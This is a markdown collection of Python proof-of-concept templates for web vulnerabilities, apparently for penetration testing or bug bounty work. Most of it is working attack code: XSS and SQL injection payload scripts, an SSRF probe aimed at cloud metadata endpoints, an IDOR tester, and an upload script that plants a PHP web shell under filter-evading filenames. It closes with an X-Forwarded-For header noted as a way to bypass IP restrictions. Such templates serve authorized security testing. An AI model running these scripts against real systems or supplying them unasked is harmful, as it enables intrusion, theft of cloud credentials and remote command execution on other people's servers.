# PoC Templates

## Overview
Standard proof-of-concept code templates for common vulnerabilities.

## XSS PoC
```python
import requests
from urllib.parse import urlencode

def xss_poc(target_url, param, payload):
    """
    XSS Proof of Concept
    
    Usage:
        xss_poc("http://target.com/search", "q", "<script>alert(1)</script>")
    """
    params = {param: payload}
    full_url = f"{target_url}?{urlencode(params)}"
    
    response = requests.get(full_url)
    
    print(f"[*] Target: {full_url}")
    print(f"[*] Status: {response.status_code}")
    
    if payload in response.text:
        print("[+] VULNERABLE: Payload reflected in response!")
        print(f"[+] Payload: {payload}")
        return True
    else:
        print("[-] Payload not reflected")
        return False

if __name__ == "__main__":
    xss_poc(
        target_url="http://target.com/search",
        param="q",
        payload='"><script>alert(document.domain)</script>'
    )
```

## SQLi PoC
```python
import requests
import time

def sqli_poc(target_url, param, method="GET"):
    """
    SQL Injection Proof of Concept
    
    Tests for error-based and time-based SQLi.
    """
    payloads = {
        "error_based": ["'", '"', "' OR '1'='1", "1' ORDER BY 1--"],
        "time_based": ["' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--"]
    }
    
    print(f"[*] Testing: {target_url}")
    print(f"[*] Parameter: {param}")
    
    # Error-based test
    for payload in payloads["error_based"]:
        if method == "GET":
            response = requests.get(target_url, params={param: payload})
        else:
            response = requests.post(target_url, data={param: payload})
        
        errors = ["sql", "syntax", "mysql", "postgresql", "oracle", "sqlite"]
        if any(err in response.text.lower() for err in errors):
            print(f"[+] ERROR-BASED SQLi FOUND!")
            print(f"[+] Payload: {payload}")
            return {"type": "error-based", "payload": payload}
    
    # Time-based test
    for payload in payloads["time_based"]:
        start = time.time()
        if method == "GET":
            response = requests.get(target_url, params={param: payload})
        else:
            response = requests.post(target_url, data={param: payload})
        elapsed = time.time() - start
        
        if elapsed >= 5:
            print(f"[+] TIME-BASED SQLi FOUND!")
            print(f"[+] Payload: {payload}")
            print(f"[+] Delay: {elapsed:.2f}s")
            return {"type": "time-based", "payload": payload, "delay": elapsed}
    
    print("[-] No SQLi detected")
    return None

if __name__ == "__main__":
    sqli_poc("http://target.com/login", "username", method="POST")
```

## SSRF PoC
```python
import requests

def ssrf_poc(target_url, param, callback_url=None):
    """
    SSRF Proof of Concept
    
    Tests for access to internal services.
    """
    internal_targets = [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:8080",
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/",  # GCP
    ]
    
    if callback_url:
        internal_targets.append(callback_url)
    
    print(f"[*] Testing SSRF on: {target_url}")
    
    for target in internal_targets:
        response = requests.get(target_url, params={param: target})
        
        indicators = ["root:", "localhost", "127.0.0.1", "ami-id", "instance-id"]
        for indicator in indicators:
            if indicator in response.text:
                print(f"[+] SSRF CONFIRMED!")
                print(f"[+] Payload: {target}")
                print(f"[+] Indicator: {indicator}")
                return {"vulnerable": True, "payload": target}
    
    print("[-] No direct SSRF detected (try blind detection)")
    return None

if __name__ == "__main__":
    ssrf_poc("http://target.com/fetch", "url")
```

## IDOR PoC
```python
import requests

def idor_poc(base_url, your_id, target_id, cookies):
    """
    IDOR Proof of Concept
    
    Tests unauthorized access to another user's resource.
    """
    your_url = base_url.replace("{id}", str(your_id))
    target_url = base_url.replace("{id}", str(target_id))
    
    print(f"[*] Your resource: {your_url}")
    print(f"[*] Target resource: {target_url}")
    
    # Get your own resource
    your_response = requests.get(your_url, cookies=cookies)
    
    # Try to access target resource
    target_response = requests.get(target_url, cookies=cookies)
    
    if target_response.status_code == 200:
        if target_response.text != your_response.text:
            print(f"[+] IDOR CONFIRMED!")
            print(f"[+] Accessed user ID: {target_id}")
            print(f"[+] Status: {target_response.status_code}")
            return {"vulnerable": True, "accessed_id": target_id}
        else:
            print("[?] Same response - might be cached or default")
    else:
        print(f"[-] Access denied: {target_response.status_code}")
    
    return None

if __name__ == "__main__":
    idor_poc(
        base_url="http://target.com/api/users/{id}/profile",
        your_id=123,
        target_id=124,
        cookies={"session": "your_session_here"}
    )
```

## File Upload PoC
```python
import requests

def upload_poc(upload_url, cookies=None):
    """
    File Upload Vulnerability PoC
    
    Tests for unrestricted file upload.
    """
    # PHP webshell content
    php_shell = '<?php system($_GET["cmd"]); ?>'
    
    # Test files
    test_files = [
        ("shell.php", php_shell, "application/x-php"),
        ("shell.php.jpg", php_shell, "image/jpeg"),
        ("shell.pHp", php_shell, "application/x-php"),
        ("shell.php%00.jpg", php_shell, "image/jpeg"),
    ]
    
    print(f"[*] Testing upload at: {upload_url}")
    
    for filename, content, content_type in test_files:
        files = {"file": (filename, content, content_type)}
        response = requests.post(upload_url, files=files, cookies=cookies)
        
        if response.status_code == 200:
            # Check if upload was successful
            if "success" in response.text.lower() or "uploaded" in response.text.lower():
                print(f"[+] UPLOAD SUCCESSFUL: {filename}")
                return {"vulnerable": True, "filename": filename}
    
    print("[-] All upload attempts blocked")
    return None

if __name__ == "__main__":
    upload_poc("http://target.com/upload")
```

## Common PoC Headers
```python
# Add these headers when needed
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Forwarded-For": "127.0.0.1",  # Sometimes bypasses IP restrictions
}
```
